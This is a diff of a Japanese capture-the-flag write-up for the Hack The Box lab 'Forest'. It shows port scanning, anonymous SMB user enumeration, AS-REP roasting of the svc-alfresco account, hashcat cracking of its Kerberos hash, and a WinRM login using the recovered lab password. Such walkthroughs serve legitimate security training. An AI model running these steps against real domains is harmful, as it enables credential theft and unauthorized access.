@@ -2,19 +2,7 @@ https://app.hackthebox.com/machines/Forest
 
 ## STEP 1
 ```sh
-└─$ rustscan -a 10.129.95.210 --scripts none   
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-________________________________________
-: http://discord.skerritt.blog         :
-: https://github.com/RustScan/RustScan :
- --------------------------------------
-RustScan: Where '404 Not Found' meets '200 OK'.
-
-[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+└─$ rustscan -a 10.129.95.210 --no-banner --scripts none   
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.95.210:53
@@ -43,46 +31,12 @@ Open 10.129.95.210:49700
 Open 10.129.95.210:49861
 10.129.95.210 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861]
 ```
-```sh
-└─$ nmap -n -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49668,49664,49666,49665,49671,49680,49681,49685,49700,49861 10.129.95.210
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 21:51 EDT
-Nmap scan report for 10.129.95.210
-Host is up (0.76s latency).
-
-PORT      STATE SERVICE
-53/tcp    open  domain
-88/tcp    open  kerberos-sec
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-389/tcp   open  ldap
-445/tcp   open  microsoft-ds
-464/tcp   open  kpasswd5
-593/tcp   open  http-rpc-epmap
-636/tcp   open  ldapssl
-3268/tcp  open  globalcatLDAP
-3269/tcp  open  globalcatLDAPssl
-5985/tcp  open  wsman
-9389/tcp  open  adws
-47001/tcp open  winrm
-49664/tcp open  unknown
-49665/tcp open  unknown
-49666/tcp open  unknown
-49668/tcp open  unknown
-49671/tcp open  unknown
-49680/tcp open  unknown
-49681/tcp open  unknown
-49685/tcp open  unknown
-49700/tcp open  unknown
-49861/tcp open  unknown
-
-Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
-```
 
 
 ## STEP 2
-anonymousでユーザ列挙できた
+クレデンシャルなしでユーザ列挙できた
 ```sh
-└─$ netexec smb -u '' -p '' --users 10.129.95.210
+└─$ netexec smb -u '' -p '' --users-export users.txt 10.129.95.210
 SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
 SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
 SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
@@ -119,116 +73,40 @@ SMB         10.129.95.210   445    FOREST           mark                        
 SMB         10.129.95.210   445    FOREST           santi                         2019-09-20 23:02:55 0        
 SMB         10.129.95.210   445    FOREST           [*] Enumerated 31 local users: HTB
 ```
-先ほどのユーザからパスワードが設定されているものでasreproastしてみると、svc-alfrescoのチケットを取得できた
+取得したユーザをasreproastしてみると、svc-alfrescoのチケットを取得できた
 ```sh
-└─$ netexec ldap -u user.txt -p '' --asreproast hash.txt 10.129.95.210
+└─$ netexec ldap -u users.txt -p '' --asreproast asreproast.txt 10.129.95.210
 LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc901cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c67850a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91
 ```
 ハッシュ形式を確認し、クラック成功！
 ```sh
-└─$ nth -f hash.txt 
+└─$ nth -f asreproast.txt --no-banner --no-john 
 
-  _   _                           _____ _           _          _   _           _     
- | \ | |                         |_   _| |         | |        | | | |         | |    
- |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
- | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
- | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
- \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
-
-https://twitter.com/bee_sec_san
-https://github.com/HashPals/Name-That-Hash 
-    
-
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc9
-01cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1
-fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c678
+50a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c
+173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91
 
 Most Likely 
-Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory
+Kerberos 5 AS-REP etype 23, HC: 18200 Summary: Used for Windows Active Directory
+
+└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quiet
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a90d5a93c96a69609515448fe9204315832a41850bf6fe5f4cbbb841856407453586ef00ad5eead10e1e553116fbe8f170e80e4f5b4c7827a7150d347d374341d574e34202f18eaed0729e6417c67850a36554750dda865574a79093944594c37f8dbcbec4fb0915ab9213db7f02d558ca56531410276c2eded0e40114511b40526de586180c5c2c51d49f9c3e1bc1a23bab39aafbd44d7bb1c1dc6526acb9ca35ea356fb8ca779802898d6e7caaaa6ae87dac6be2065c8c8ee46073e0b23d9ecbe807a77c173763a311704f8621f496239008130cb844906641b7fb6bf14a8c3f91:s3rvice
 ```
-```sh
-└─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
-hashcat (v6.2.6) starting
-
-OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-====================================================================================================================================================
-* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 155H, 2099/4263 MB (1024 MB allocatable), 2MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 0 MB
-
-Dictionary cache built:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344392
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-* Runtime...: 1 sec
-
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a3ee92654df112839cc$0dd5ff910de59a4a493ccd35c2041ba09030a48456f83526b167a68de43e50d4296132ad2f1105edc8da7c403622748b1be39d3764d4a55f47692a11a0d3a22a930f99e8fcb2946479c1941a64dc3365574dac8eb90c6809f600b2208d23e3115913bffd939b882f9388e85686bdc9193eb995dbf08ce66477a908f8796d9b1de64b01542b14f87ae923624aa948d694a515631cc65409c9cd226cb15a68665075b64b16d93518a69669a2aa49d762bb1f01165de9a2c1589be998123d0dbf3f38b65a4c663983c0a3f63da157482050b5525bb8bba82e6df2d67699c1981f229f8ac61ba1b3:s3rvice
-                                                          
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
-Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a...1ba1b3
-Time.Started.....: Sat Jul  5 09:42:35 2025 (3 secs)
-Time.Estimated...: Sat Jul  5 09:42:38 2025 (0 secs)
-Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:  1076.1 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 4085760/14344385 (28.48%)
-Rejected.........: 0/4085760 (0.00%)
-Restore.Point....: 4084736/14344385 (28.48%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidate.Engine.: Device Generator
-Candidates.#1....: s456822 -> s3r3ndipit
-Hardware.Mon.#1..: Util: 83%
-
-Cracking performance lower than expected?                 
-
-* Append -O to the commandline.
-  This lowers the maximum supported password/salt length (usually down to 32).
-
-* Append -w 3 to the commandline.
-  This can cause your screen to lag.
-
-* Append -S to the commandline.
-  This has a drastic speed impact but can be better for specific attacks.
-  Typical scenarios are a small wordlist but a large ruleset.
-
-* Update your backend API runtime / driver the right way:
-  https://hashcat.net/faq/wrongdriver
-
-* Create more work items to make use of your parallelization power:
-  https://hashcat.net/faq/morework
-
-[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Jul  5 09:42:18 2025
-Stopped: Sat Jul  5 09:42:39 2025
-```
-5985番ポートが開いていたので、取得したクレデンシャルでログイン成功！ユーザフラグゲット
+取得したクレデンシャルでwinrmログイン成功！ユーザフラグゲット
 ```sh
 └─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                         
